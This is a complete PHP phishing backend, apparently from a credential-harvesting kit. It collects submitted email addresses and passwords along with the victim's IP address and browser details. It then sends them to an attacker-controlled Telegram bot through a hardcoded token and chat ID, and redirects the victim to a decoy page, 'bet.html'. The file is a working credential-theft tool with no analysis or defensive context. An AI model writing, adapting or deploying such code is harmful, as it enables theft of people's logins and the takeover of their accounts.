<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "-------DKK----------\n";
$message .= "Email : ".$_POST['zz']."\n";
$message .= "Pass : ".$_POST['aa']."\n";
$message .= "----------- IP Infos -------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------DKK---------------------\n";
$token = "6142767231:AAE3TXvOHZVVhLH5-LPAjHJ9ThU6rzKY8w8";
$data = [
    'text' => $message,
    'chat_id' => '-5143241668'
];
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

 

header("Location: ../bet.html");
exit;
?>
